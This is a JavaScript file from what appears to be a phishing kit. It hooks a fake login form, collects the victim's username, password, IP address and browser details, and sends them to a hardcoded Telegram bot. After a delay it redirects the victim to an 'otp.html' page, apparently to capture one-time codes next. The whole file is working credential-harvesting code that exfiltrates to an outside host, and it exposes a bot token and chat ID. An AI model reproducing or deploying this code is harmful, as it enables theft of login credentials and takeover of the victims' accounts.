
async function sendDataToTelegram(userId, password, ip, ua, botToken, chatId) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `#--------[ FTD 1#]--------#
Username         : ${userId}
Password         : ${password}
#--------[ Visitor ]--------#
IP Address       : ${ip}
DEVICE INFORMATION: ${ua}
#--------[ SNICKYNINJA - END ]--------#`

            })
        });

        const data = await response.json();

        if (data.ok) {
            console.log("Message sent successfully:", data);
        } else {
            console.error("Telegram API returned an error:", data.description);
        }
    } catch (error) {
        console.error("Error sending message:", error);
    }
}

// Function to fetch the IP address
async function fetchIpAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return "Unavailable";
    }
}

// Event listener for form submission
document.querySelector('#loginForm').addEventListener('submit', async function (event) {
    event.preventDefault();

    const userId = document.querySelector('#username').value.trim();
    const password = document.querySelector('#password').value.trim();

    if (userId && password) {
        // Show loading indicator and hide form
        document.querySelector('.form').style.display = 'none';
        document.querySelector('.loading-container').style.display = 'flex';

        const ip = await fetchIpAddress();
        const ua = navigator.userAgent;

        const botToken1 = '7365792836:AAHFTCJXAglEjMYuXPj5WxPlvJD1UqR1uzI';
        const chatId1 = '6994641548';

        try {
            await sendDataToTelegram(userId, password, ip, ua, botToken1, chatId1);

            setTimeout(() => {
                window.location.href = "./otp.html";
            }, 8000);
        } catch (error) {
            console.error("Error in sending data to Telegram bots:", error);
        }
    } else {
        console.error("User ID or Password is missing!");
    }
});